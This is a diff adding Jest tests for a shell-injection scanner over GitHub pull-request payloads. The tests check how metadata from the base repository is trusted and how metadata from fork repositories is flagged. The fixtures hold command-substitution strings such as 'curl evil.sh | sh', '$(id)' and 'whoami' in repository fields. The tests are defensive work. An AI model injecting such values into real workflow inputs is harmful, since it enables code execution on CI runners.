@@ -662,3 +662,70 @@ describe('scanValue', () => {
     expect(findings[0].path).toBe('issue.title');
   });
 });
+
+describe('repository metadata trust', () => {
+  const actionlintPayload = require('./fixtures/actionlint-pull-request.json');
+
+  test('does NOT flag backticks in repo descriptions on a same-repo PR (actionlint payload)', () => {
+    // Regression: devops-actions/actionlint#232 failed with three shell_injection
+    // findings on repository.description, pull_request.base.repo.description and
+    // pull_request.head.repo.description ("Action wrapper for `rhysd/actionlint`").
+    expect(scanValue(actionlintPayload)).toHaveLength(0);
+  });
+
+  test('skips topics and homepage on the workflow repository', () => {
+    const findings = scanValue({
+      repository: {
+        description: 'Runs `make` for you',
+        homepage: 'https://example.com/$(docs)',
+        topics: ['`tag`'],
+      },
+    });
+    expect(findings).toHaveLength(0);
+  });
+
+  test('still scans non-metadata fields on repo objects', () => {
+    const findings = scanValue({
+      repository: { description: 'ok `x`', name: 'repo​name' },
+    });
+    expect(findings).toHaveLength(1);
+    expect(findings[0].path).toBe('repository.name');
+  });
+
+  test('still scans the same field names outside repo objects', () => {
+    const findings = scanValue({ issue: { description: 'run `whoami`' } });
+    expect(findings).toHaveLength(1);
+    expect(findings[0].path).toBe('issue.description');
+  });
+
+  test('DOES flag head.repo metadata on a fork PR (fork owner controls it)', () => {
+    const base = { id: 1, full_name: 'devops-actions/actionlint', description: 'Action wrapper for `rhysd/actionlint`' };
+    const fork = {
+      id: 2,
+      full_name: 'attacker/actionlint',
+      fork: true,
+      description: 'pwn `curl evil.sh | sh`',
+      topics: ['$(id)'],
+    };
+    const findings = scanValue({
+      pull_request: { base: { repo: base }, head: { repo: fork } },
+      repository: base,
+    });
+    const paths = findings.map((f) => f.path).sort();
+    expect(paths).toEqual(['pull_request.head.repo.description', 'pull_request.head.repo.topics[0]']);
+  });
+
+  test('falls back to full_name when repo ids are missing', () => {
+    const same = { full_name: 'o/r', description: 'uses `x`' };
+    expect(scanValue({ pull_request: { base: { repo: same }, head: { repo: { ...same } } } })).toHaveLength(0);
+    const findings = scanValue({
+      pull_request: { base: { repo: same }, head: { repo: { full_name: 'evil/r', description: 'uses `x`' } } },
+    });
+    expect(findings.map((f) => f.path)).toEqual(['pull_request.head.repo.description']);
+  });
+
+  test('scans head.repo metadata when base repo is missing', () => {
+    const findings = scanValue({ pull_request: { head: { repo: { id: 1, description: 'uses `x`' } } } });
+    expect(findings).toHaveLength(1);
+  });
+});
